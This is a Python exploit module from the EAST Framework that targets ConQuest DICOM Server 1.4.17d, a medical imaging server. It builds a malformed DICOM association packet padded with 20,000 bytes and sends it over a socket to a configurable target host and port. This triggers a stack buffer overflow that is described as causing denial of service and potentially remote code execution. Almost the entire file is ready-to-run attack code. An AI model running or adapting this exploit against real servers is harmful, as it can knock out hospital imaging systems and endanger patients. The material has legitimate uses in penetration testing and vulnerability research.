#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import os
import time
import socket
import struct

sys.path.append('./core')
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_conquest_dicom_server_dos"
INFO['DESCRIPTION'] = "ConQuest DICOM Server 1.4.17d Remote Stack Buffer Overflow RCE"
INFO['VENDOR'] = "http://dicom.nema.org"
INFO['DOWNLOAD_LINK'] = ''
INFO['LINKS'] = ['https://packetstormsecurity.com/files/140190/ConQuest-DICOM-Server-1.4.17d-Remote-Stack-Buffer-Overflow.html']
INFO["CVE Name"] = "?"
INFO["NOTES"] = """The vulnerability is caused due to the usage of vulnerable collection of libraries that are part of DCMTK Toolkit, specifically the parser for the DICOM Upper Layer Protocol or DUL. Stack/Heap Buffer overflow/underflow can be triggered when sending and processing wrong length of ACSE data structure received over the network by the DICOM Store-SCP service. An attacker can overflow the stack and the heap of the process when sending large array of bytes to the presentation context item length segment of the DICOM standard, potentially resulting in remote code execution and/or denial of service scenario.
"""
INFO['CHANGELOG'] = "23 Dec, 2016. Written by Gleg team."
INFO['PATH'] = 'Exploits/Dos/'

# Must be in every module, to be set by framework
OPTIONS = {}
OPTIONS["HOST"] = "192.168.1.189", dict(description = 'Target IP')
OPTIONS["PORT"] = 5678, dict(description = 'Target port')


class exploit(Sploit):
    def __init__(self, host = "", port = 0, logger = None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.port = port
        self.host = host
        
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', self.host)
        self.port = int(self.args.get('PORT', self.port))
        return
    
    def run(self):
        self.args()
        self.log("")
        
        hello = (
        '\x01\x00\x00\x00\x80\x71\x00\x01\x00\x00\x4f\x52\x54\x48'
        '\x41\x4e\x43\x20\x20\x20\x20\x20\x20\x20\x20\x20\x4a\x4f'
        '\x58\x59\x50\x4f\x58\x59\x21\x00\x00\x00\x00\x00\x00\x00'
        '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        '\x00\x00\x00\x00\x10\x00\x00\x15\x31\x2e\x32\x2e\x38\x34'
        '\x30\x2e\x31\x30\x30\x30\x38\x2e\x33\x2e\x31\x2e\x31\x2e'
        '\x31\x20\x00\x80\x00')
        bye = ('\x50\x00\x00\x0c\x51\x00\x00\x04\x00\x00\x07\xde'
        '\x52\x00\x00\x00')
        packet = hello + 'A' * 20000 + bye
        
        s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        try:
            s1.connect((self.host, self.port))
            self.log('Send malicious packet')
            s1.sendall(packet)
            s1.close()
        except Exception as e:
            self.log(e)
            self.finish(False)
            
        self.finish(True)

if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """

    print "Running exploit %s .. " % INFO['NAME']
    e = exploit('', 80)
    e.run()
